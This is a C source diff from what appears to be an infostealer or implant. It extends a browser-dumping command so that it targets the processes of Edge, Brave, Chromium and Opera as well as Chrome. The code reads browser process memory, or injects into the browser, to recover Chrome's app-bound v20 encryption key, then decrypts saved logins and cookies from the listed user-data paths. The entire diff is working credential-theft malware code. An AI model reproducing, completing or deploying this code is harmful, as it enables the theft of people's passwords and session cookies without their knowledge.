@@ -801,7 +801,8 @@ static int _extract_v20_hint(const char *db_path, _v20_hint_t *hint)
  * Use a known (nonce, ct, tag) triplet from a v20 blob as oracle:
  * try each 16-byte-aligned candidate key, accept on GCM tag match.
  */
-static int _scan_chrome_memory(const _v20_hint_t *hint, uint8_t key_out[32])
+static int _scan_chrome_memory(const _v20_hint_t *hint, const char *proc_name,
+                               uint8_t key_out[32])
 {
     if (!hint->found || hint->ct_len == 0) return -1;
 
@@ -819,7 +820,7 @@ static int _scan_chrome_memory(const _v20_hint_t *hint, uint8_t key_out[32])
     uint8_t  pt[512];
 
     do {
-        if (_stricmp(pe.szExeFile, "chrome.exe") != 0) continue;
+        if (_stricmp(pe.szExeFile, proc_name) != 0) continue;
 
         HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                                 FALSE, pe.th32ProcessID);
@@ -901,7 +902,7 @@ typedef struct {
  * committed READWRITE footprint (browser process >> renderers).
  * Returns 0 if no Chrome is running.
  */
-static DWORD _find_chrome_browser_pid(void)
+static DWORD _find_browser_pid(const char *proc_name)
 {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return 0;
@@ -911,7 +912,7 @@ static DWORD _find_chrome_browser_pid(void)
     SIZE_T best_bytes = 0;
 
     if (Process32First(snap, &pe)) do {
-        if (_stricmp(pe.szExeFile, "chrome.exe") != 0) continue;
+        if (_stricmp(pe.szExeFile, proc_name) != 0) continue;
         HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                 FALSE, pe.th32ProcessID);
         if (!hp) continue;
@@ -1427,6 +1428,7 @@ static int _find_cookies_db(const char *ud, const char *profile,
    use_profiles=0: Login Data directly in <ud> (Opera) */
 static void _dump_browser(const char *name,
                           const char *ud_tmpl, int use_profiles,
+                          const char *proc_name,
                           char *out, size_t outsz, size_t *pos)
 {
     char ud[MAX_PATH] = {0};
@@ -1460,12 +1462,12 @@ static void _dump_browser(const char *name,
             memset(&hint, 0, sizeof(hint));
             if (_extract_v20_hint(hint_db, &hint) == 0) {
                 /* Step 1: external scan (Chrome 127-129, no BCrypt protection) */
-                have_v20mk = (_scan_chrome_memory(&hint, v20mk) == 0);
+                have_v20mk = (_scan_chrome_memory(&hint, proc_name, v20mk) == 0);
 
 #ifdef HAVE_CHROME_INJECT
                 /* Step 2: injection (Chrome 130+, BCrypt-protected key) */
                 if (!have_v20mk) {
-                    DWORD bpid = _find_chrome_browser_pid();
+                    DWORD bpid = _find_browser_pid(proc_name);
                     if (bpid)
                         have_v20mk = (_inject_v20_chrome(bpid, &hint, v20mk) == 0);
                 }
@@ -1548,13 +1550,14 @@ int cmd_browser_dump(const char *args, char *output_buf, size_t output_size)
         const char *name;
         const char *path;
         int use_profiles;
+        const char *proc;
     } BROWSERS[] = {
-        {"Chrome", "%LOCALAPPDATA%\\Google\\Chrome\\User Data", 1},
-        {"Edge", "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data", 1},
-        {"Brave", "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data", 1},
-        {"Chromium", "%LOCALAPPDATA%\\Chromium\\User Data", 1},
-        {"Opera", "%APPDATA%\\Opera Software\\Opera Stable", 0},
-        {"OperaGX", "%APPDATA%\\Opera Software\\Opera GX Stable", 0},
+        {"Chrome",   "%LOCALAPPDATA%\\Google\\Chrome\\User Data",            1, "chrome.exe"},
+        {"Edge",     "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",           1, "msedge.exe"},
+        {"Brave",    "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data", 1, "brave.exe"},
+        {"Chromium", "%LOCALAPPDATA%\\Chromium\\User Data",                  1, "chromium.exe"},
+        {"Opera",    "%APPDATA%\\Opera Software\\Opera Stable",              0, "opera.exe"},
+        {"OperaGX",  "%APPDATA%\\Opera Software\\Opera GX Stable",          0, "opera.exe"},
     };
 
     size_t pos = 0;
@@ -1563,7 +1566,7 @@ int cmd_browser_dump(const char *args, char *output_buf, size_t output_size)
         if (pos + 64 >= output_size)
             break;
         _dump_browser(BROWSERS[i].name, BROWSERS[i].path,
-                      BROWSERS[i].use_profiles,
+                      BROWSERS[i].use_profiles, BROWSERS[i].proc,
                       output_buf, output_size, &pos);
     }
 
